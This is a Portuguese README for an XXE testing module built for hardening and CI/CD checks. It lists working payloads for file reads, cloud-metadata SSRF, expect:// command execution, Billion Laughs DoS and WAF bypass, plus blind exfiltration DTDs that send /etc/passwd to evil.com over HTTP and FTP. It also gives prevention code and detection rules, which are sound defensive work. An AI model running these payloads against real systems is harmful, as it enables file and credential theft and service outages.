# XXE Tester - Módulo de Testes XML External Entity

## Descrição

O `xxe-tester.sh` é um módulo especializado em testes de **XXE (XML External Entity)**. Utiliza os payloads do repositório **PayloadsAllTheThings/XXE Injection** para fornecer cobertura completa de técnicas de XXE, desde file retrieval básico até blind XXE, DoS e exploits em formatos exóticos (SVG, SOAP, DOCX, etc.).

## Motivação

XXE é uma vulnerabilidade crítica que permite:
- **Leitura de arquivos locais**: /etc/passwd, config.php, .env, chaves SSH
- **SSRF**: Acesso a serviços internos e cloud metadata
- **Denial of Service**: Billion Laughs, recursive expansion
- **Data exfiltration**: Out-of-Band via DNS, HTTP, FTP
- **RCE**: Via PHP wrappers, expect:// protocol

A modularização facilita:
1. **Testes Especializados**: Foco exclusivo em XXE
2. **Cobertura Completa**: 8 categorias de payloads
3. **Exotic Formats**: SVG, SOAP, RSS, SAML, WebDAV
4. **Blind XXE**: Out-of-Band exfiltration

## Estrutura

O módulo está organizado em 8 categorias principais:

### 1. XXE Básico (25 testes)
**File Retrieval via SYSTEM Entity**

#### Linux Files:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<root>&test;</root>
```

**Arquivos testados**:
- `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
- `/etc/hostname`, `/proc/version`, `/proc/self/environ`
- SSH keys: `/root/.ssh/id_rsa`, `/root/.ssh/authorized_keys`
- Logs: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`
- Configs: `/etc/mysql/my.cnf`, `/var/www/html/config.php`
- WordPress: `/var/www/html/wp-config.php`
- Environment: `/var/www/html/.env`
- Docker: `/proc/self/cmdline`
- Kubernetes: `/var/run/secrets/kubernetes.io/serviceaccount/token`

#### Windows Files:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >
]>
<foo>&xxe;</foo>
```

**Arquivos testados**:
- `C:\boot.ini`, `C:\Windows\win.ini`
- `C:\Windows\System32\drivers\etc\hosts`

#### Variations:
- **DOCTYPE variations**: Different formats
- **PUBLIC vs SYSTEM**: `<!ENTITY xxe PUBLIC "Any TEXT" "URL">`
- **Base64 encoded**: `data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk`
- **Relative paths**: `file://../../../etc/passwd`

### 2. XXE PHP Wrappers (15 testes)
**PHP-Specific Exploitation**

#### php://filter - Base64 Encoding:
```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts>
  <contact><name>&xxe;</name></contact>
</contacts>
```

Permite ler código-fonte PHP sem executá-lo.

#### php://filter - Other Encodings:
```xml
<!-- ROT13 -->
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=index.php">
]>
<root>&xxe;</root>

<!-- Upper case -->
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/read=string.toupper/resource=index.php">
]>
<root>&xxe;</root>

<!-- Chained filters -->
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/read=string.rot13|convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

#### expect:// - Command Execution (se habilitado):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>&xxe;</foo>
```

**Comandos testados**:
- `expect://id`
- `expect://whoami`
- `expect://ls -la`

#### Other Wrappers:
- `zip://file.zip#shell.php`
- `phar://file.phar/shell.php`
- `data://text/plain,XXE_TEST`

### 3. XXE XInclude (10 testes)
**Quando você não pode modificar DOCTYPE**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

#### Use Cases:
- Quando app recebe XML mas você não controla o DOCTYPE
- Upload de XML fragment
- SOAP body injection

**Arquivos testados**:
- Linux: `/etc/passwd`, `/etc/hostname`, config files
- Windows: `C:/Windows/win.ini`
- SSRF: AWS metadata, GCP metadata
- HTTP: `http://127.0.0.1/`

#### Variations:
- `parse="text"` vs `parse="xml"`
- With fallback: `<xi:fallback>FALLBACK</xi:fallback>`

### 4. XXE to SSRF (20 testes)
**Exploração de Serviços Internos**

#### Internal Services:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

**Services testados**:
- Redis (6379): `http://127.0.0.1:6379/`
- MySQL (3306): `http://127.0.0.1:3306/`
- Elasticsearch (9200): `http://127.0.0.1:9200/`
- MongoDB (27017): `http://127.0.0.1:27017/`

#### Cloud Metadata:
```xml
<!-- AWS IMDSv1 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >
]>
<foo>&xxe;</foo>

<!-- AWS Credentials -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/" >
]>
<foo>&xxe;</foo>

<!-- GCP -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/" >
]>
<foo>&xxe;</foo>

<!-- Azure -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >
]>
<foo>&xxe;</foo>
```

#### Alternative Protocols:
- **gopher://**: `gopher://127.0.0.1:6379/_INFO` (Redis)
- **dict://**: `dict://127.0.0.1:11211/stats` (Memcached)
- **ftp://**: `ftp://127.0.0.1/`

### 5. XXE Blind / OOB (20 testes)
**Out-of-Band Data Exfiltration**

#### Basic Blind XXE:
```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://xxe-test.burp.oastify.com/x">
  %ext;
]>
<r></r>
```

Detecta XXE via callback HTTP/DNS.

#### Data Exfiltration via Remote DTD:

**Payload principal**:
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
  <!ENTITY % ext SYSTEM "http://evil.com/ext.dtd">
  %ext;
]>
<message></message>
```

**ext.dtd** (hospedado em evil.com):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

O conteúdo de `/etc/passwd` aparecerá na mensagem de erro.

#### PHP Filter + OOB:
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
  <!ELEMENT r ANY >
  <!ENTITY % sp SYSTEM "http://evil.com/dtd.xml">
  %sp;
  %param1;
]>
<r>&exfil;</r>
```

**dtd.xml**:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil.com/?%data;'>">
```

#### FTP Exfiltration:
Mais eficiente para arquivos grandes:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
%dtd;
```

**xxe.dtd**:
```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com:2121/%d;'>">
```

#### Error-Based XXE:
```xml
<!-- Trigger error with filename -->
<!DOCTYPE root [
  <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
  %local_dtd;
]>
<root></root>
```

### 6. XXE Denial of Service (10 testes)
**⚠️ WARNING: Pode crashar a aplicação!**

#### Billion Laughs Attack:
```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

Expansão recursiva: **10^10 = 10 bilhões** de "dos".

#### Parameter Laugh Attack:
```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

#### Other DoS Techniques:
- `/dev/random`: Leitura infinita
- `/dev/urandom`: Leitura infinita
- `/dev/zero`: Memory exhaustion
- Slow remote DTD: Connection timeout

### 7. XXE WAF Bypass (20 testes)
**Técnicas de Evasão**

#### Character Encoding:
```bash
# Convert to UTF-16
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

Headers:
```
Content-Type: text/xml; charset=UTF-16
```

#### Case Variation:
```xml
<!-- Lowercase DOCTYPE/ENTITY -->
<!doctype foo [<!entity xxe system "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Mixed case -->
<!DoCtYpE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### Whitespace Bypass:
```xml
<!-- Extra spaces -->
<! DOCTYPE   foo   [<! ENTITY   xxe   SYSTEM   "file:///etc/passwd"  >]>
<foo>&xxe;</foo>

<!-- Tabs -->
<!DOCTYPE	foo	[<!ENTITY	xxe	SYSTEM	"file:///etc/passwd">]>
  
<!-- Newlines -->
<!DOCTYPE
foo
[<!ENTITY
xxe
SYSTEM
"file:///etc/passwd">]>
```

#### Comment Insertion:
```xml
<!DOCTYPE foo [<!--comment--><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY<!---->xxe SYSTEM "file:///etc/passwd">]>
```

#### JSON to XML:
```xml
<!-- Change Content-Type from application/json to application/xml -->
<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <search>name</search>
  <value>data</value>
</root>
```

#### PUBLIC vs SYSTEM:
```xml
<!ENTITY xxe PUBLIC "Any Text" "file:///etc/passwd">
```

### 8. XXE in Exotic Files (15 testes)
**Formatos Especiais**

#### SVG (Scalable Vector Graphics):
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Upload em avatar, profile picture, etc.

#### SVG with xlink (expect://):
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

#### SOAP:
```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://evil.com/">%dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

#### RSS Feed:
```xml
<?xml version="1.0"?>
<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<rss version="2.0">
  <channel><title>&xxe;</title></channel>
</rss>
```

#### SAML (Security Assertion Markup Language):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  &xxe;
</samlp:Response>
```

#### WebDAV PROPFIND:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<propfind xmlns="DAV:">
  <prop>&xxe;</prop>
</propfind>
```

#### Office Files (DOCX/XLSX/PPTX):
Estrutura do DOCX:
```
DOCX/
├── _rels/.rels
├── [Content_Types].xml
├── word/
│   └── document.xml    ← Inject here
└── xl/
    └── workbook.xml    ← Or here for XLSX
```

**Injetar em `word/document.xml`**:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://evil.com/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
...
```

Rebuild:
```bash
cd DOCX
zip -r -u ../xxe.docx *
```

#### Others:
- **Atom Feed**: `<feed xmlns="http://www.w3.org/2005/Atom">`
- **KML** (Google Earth): GPS location data
- **GPX** (GPS Exchange): Fitness apps
- **XLIFF**: Translation files
- **XMPP**: Chat protocols

## Uso

### Executar apenas testes XXE
```bash
./head-test.sh -u https://example.com -c xxe
```

### Executar todos os testes (incluindo XXE)
```bash
./head-test.sh -u https://example.com -c all
```

### Com velocidade TURBO
```bash
./head-test.sh -u https://example.com -c xxe --speed 5
```

### Filtrar apenas vulnerabilidades
```bash
./head-test.sh -u https://example.com -c xxe --filter fail
```

## Arquitetura

```
head-test.sh
├── source xxe-tester.sh
│   ├── test_xxe_basic()
│   ├── test_xxe_php_wrappers()
│   ├── test_xxe_xinclude()
│   ├── test_xxe_ssrf()
│   ├── test_xxe_blind()
│   ├── test_xxe_dos()
│   ├── test_xxe_waf_bypass()
│   ├── test_xxe_exotic()
│   └── run_all_xxe_tests() [função principal]
└── PayloadsAllTheThings/XXE Injection/
    ├── README.md
    ├── Files/
    └── Intruders/
```

## Payloads Utilizados

- **PayloadsAllTheThings**: XXE Injection repository
- **Local DTD files**: Linux (`/usr/share/xml/fontconfig/fonts.dtd`)
- **Windows DTD**: `C:\Windows\System32\wbem\xml\cim20.dtd`
- **Exotic formats**: SVG, SOAP, SAML, RSS, WebDAV

## Técnicas Testadas

### 1. **Classic XXE**
File retrieval via SYSTEM entity.

### 2. **PHP Wrappers**
php://filter, expect://, zip://, phar://, data://

### 3. **XInclude**
Quando DOCTYPE não é controlável.

### 4. **XXE to SSRF**
Acesso a serviços internos e cloud metadata.

### 5. **Blind XXE**
Out-of-Band exfiltration via HTTP/DNS/FTP.

### 6. **Denial of Service**
Billion Laughs, parameter laugh, recursive expansion.

### 7. **WAF Bypass**
Encoding, case variation, whitespace, comments.

### 8. **Exotic Formats**
SVG, SOAP, SAML, RSS, WebDAV, Office files.

## Quantidade de Testes

**Total estimado: 150+ testes de XXE**

Distribuídos em:
- 25 testes básicos (file retrieval)
- 15 testes PHP wrappers
- 10 testes XInclude
- 20 testes XXE to SSRF
- 20 testes blind/OOB
- 10 testes DoS (⚠️ perigosos)
- 20 testes WAF bypass
- 15 testes exotic files
- +15 testes XXE (já existentes no head-test.sh)

## Parsers Vulneráveis

- ✅ **PHP libxml** (≤ 2.9.0 por padrão vulnerável)
- ✅ **Java** (DocumentBuilder, SAXParser, XMLReader)
- ✅ **Python** (xml.etree, lxml, minidom)
- ✅ **.NET** (XmlDocument, XmlTextReader)
- ✅ **Ruby** (REXML, Nokogiri)
- ✅ **Go** (encoding/xml)

## Comparação com Ferramentas

| Ferramenta | xxe-tester.sh | XXEinjector | oxml_xxe |
|------------|---------------|-------------|----------|
| **Propósito** | Hardening test | Exploitation | File embedding |
| **Velocidade** | ⚡ Muito rápido | 🐢 Lento | ⚡ Rápido |
| **Cobertura** | 150+ payloads | Completa + OOB | Exotic files |
| **Automação** | Total | Semi-auto | Manual |
| **Blind XXE** | ✅ 20 testes | ✅ Sim | ❌ Não |
| **Exotic files** | ✅ 15 testes | ❌ Não | ✅ Sim (DOCX, SVG) |
| **Uso** | CI/CD, hardening | Pentesting | Payload generation |

## Casos de Uso

### 1. **Hardening Validation**
Verificar se parsers XML estão configurados corretamente.

### 2. **API Security Testing**
Testar endpoints que aceitam XML (SOAP, REST XML).

### 3. **File Upload Testing**
SVG, DOCX, XLSX uploads.

### 4. **CI/CD Integration**
```bash
#!/bin/bash
API_URL="https://api.example.com"

./head-test.sh -u "$API_URL" -c xxe --speed 5 --filter fail

if [ $? -ne 0 ]; then
    echo "❌ XXE vulnerabilities detected!"
    exit 1
fi
```

## Severidade

XXE é classificada como **CRÍTICA/ALTA** porque:

- ✅ **File read**: /etc/passwd, chaves SSH, configs sensíveis
- ✅ **SSRF**: Acesso a cloud metadata (AWS credentials)
- ✅ **DoS**: Billion Laughs crash server
- ✅ **RCE**: Via expect:// ou PHP wrappers
- ✅ **Data exfiltration**: Blind XXE OOB

**CVSS Score**: 
- XXE (file read): 6.5-7.5 (HIGH)
- XXE (SSRF): 7.5-8.5 (HIGH)
- XXE (RCE): 9.0-10.0 (CRITICAL)

## Exemplos de Exploração Real

### File Read
```php
// Código vulnerável
libxml_disable_entity_loader(false); // BAD!
$dom = new DOMDocument();
$dom->loadXML($_POST['xml'], LIBXML_DTDLOAD | LIBXML_DTDATTR);
echo $dom->saveXML();
```

**Exploit**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Billion Laughs DoS
```xml
<!DOCTYPE data [
  <!ENTITY a0 "dos">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

Result: **10 bilhões** de "dos" → Memory exhaustion.

## Prevenção

### 1. **Disable External Entities**

**PHP**:
```php
// SECURE
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

**Java**:
```java
// SECURE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python**:
```python
# SECURE - Use defusedxml
from defusedxml import ElementTree as ET
tree = ET.parse('data.xml')
```

**.NET**:
```csharp
// SECURE
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

### 2. **Input Validation**
```php
// Whitelist allowed tags
$allowed_tags = ['root', 'data', 'item'];
// Reject if DOCTYPE present
if (strpos($xml, '<!DOCTYPE') !== false) {
    die('DOCTYPE not allowed');
}
```

### 3. **Use JSON Instead**
Se possível, migre de XML para JSON:
- Sem entidades
- Sem DTD
- Parsing mais simples

### 4. **Content-Type Validation**
```php
// Reject XML on JSON endpoints
if ($_SERVER['CONTENT_TYPE'] === 'application/xml' && 
    $endpoint_expects_json) {
    http_response_code(415); // Unsupported Media Type
    die();
}
```

### 5. **Parser Configuration**

**PHP php.ini**:
```ini
; Disable external entity loading
allow_url_fopen = Off
allow_url_include = Off
```

## Detecção e Monitoramento

### 1. **WAF Rules**
```nginx
# ModSecurity
SecRule REQUEST_BODY "@rx (?:<!(?:DOCTYPE|ENTITY)|SYSTEM\s|PUBLIC\s)" \
  "id:3001,deny,status:403,msg:'XXE Attack'"
```

### 2. **Application Logs**
```bash
# Monitor for XXE patterns
grep -E '<!DOCTYPE|<!ENTITY|SYSTEM|file://|expect://' /var/log/app.log
```

### 3. **Network Monitoring**
- Monitor outbound connections to cloud metadata (169.254.169.254)
- Alert on DNS queries to *.burp.oastify.com
- Monitor FTP connections on port 2121 (common XXE exfil)

## Próximos Passos

Melhorias futuras:

1. **Local DTD Exploitation**: Usar DTDs locais para error-based XXE
2. **YAML Bomb**: Similar ao Billion Laughs
3. **XML Signature Wrapping**: Bypass de validação
4. **XSW (XML Signature Wrapping)**: SAML attacks
5. **XXE in API Gateway**: Kong, Apigee, AWS API Gateway

## Ferramentas Complementares

- **[XXEinjector](https://github.com/enjoiz/XXEinjector)**: Automatic XXE exploitation
- **[oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)**: Embed XXE in DOCX/XLSX
- **[xxeserv](https://github.com/staaldraad/xxeserv)**: FTP server for blind XXE
- **[230-OOB](https://github.com/lc/230-OOB)**: XXE OOB server
- **[defusedxml](https://github.com/tiran/defusedxml)**: Secure XML parsing (Python)

## Referências

- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [PortSwigger - XML External Entity](https://portswigger.net/web-security/xxe)
- [OWASP - XXE Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [HackTricks - XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

## FAQ

**Q: XXE funciona em JSON APIs?**  
A: Às vezes! Tente mudar `Content-Type` de `application/json` para `application/xml`.

**Q: Billion Laughs pode derrubar o servidor?**  
A: Sim! Use apenas em ambientes de teste/dev. Nunca em produção.

**Q: Como detectar Blind XXE?**  
A: Use Burp Collaborator ou tools como xxeserv para callbacks OOB.

**Q: PHP filter funciona em todos os parsers?**  
A: Não, apenas PHP. Use `expect://` para outras linguagens (se habilitado).

**Meta final**: 100% de proteção contra XXE e external entities!
